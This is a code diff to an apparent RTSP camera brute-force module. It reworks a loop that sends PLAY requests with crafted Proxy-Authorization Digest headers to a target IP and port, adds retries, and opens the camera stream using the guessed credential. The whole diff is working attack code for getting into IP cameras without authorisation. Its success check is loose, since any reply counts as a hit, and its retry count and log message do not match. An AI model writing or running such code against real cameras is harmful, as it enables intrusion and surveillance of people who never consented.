@@ -100,26 +100,33 @@ class RTSPBruteModule:
             f"Proxy-Authorization: Digest username=\"{user}\", realm=\"\", nonce=\"\", uri=\"rtsp://{ip}:{port}/\", response=\"\"\r\n",
         ]
 
-        for auth in auth_methods:
-            req = (
-                f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
-                f"CSeq: 2\r\n"
-                f"{auth}\r\n"
-            )
+        retries = 3
 
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(self.timeout)
-                s.connect((ip, int(port)))
-                encodereq = req.encode('ascii')
-                s.sendall(encodereq)
-                data = s.recv(1024)
-                response = data.decode('ascii')
-                s.close()
-                url = f"rtsp://{credential}@{ip}:{port}/"
-                return self.display_camera(url)
-            except socket.error as e:
-                continue
+        for _ in range(retries):
+            for auth in auth_methods:
+                req = (
+                    f"PLAY rtsp://{ip}:{port}/ RTSP/1.0\r\n"
+                    f"CSeq: 2\r\n"
+                    f"{auth}\r\n"
+                )
+
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(self.timeout)
+                    s.connect((ip, int(port)))
+                    encodereq = req.encode('ascii')
+                    s.sendall(encodereq)
+                    data = s.recv(1024)
+                    response = data.decode('ascii')
+                    s.close()
+                    url = f"rtsp://{credential}@{ip}:{port}/"
+                    return self.display_camera(url)
+                except socket.timeout:
+                    logging.info(f"Timeout occurred. Retrying... (Attempts left: {retries - 1})")
+                except socket.error as e:
+                    continue
+
+            retries -= 1
 
         return False
 
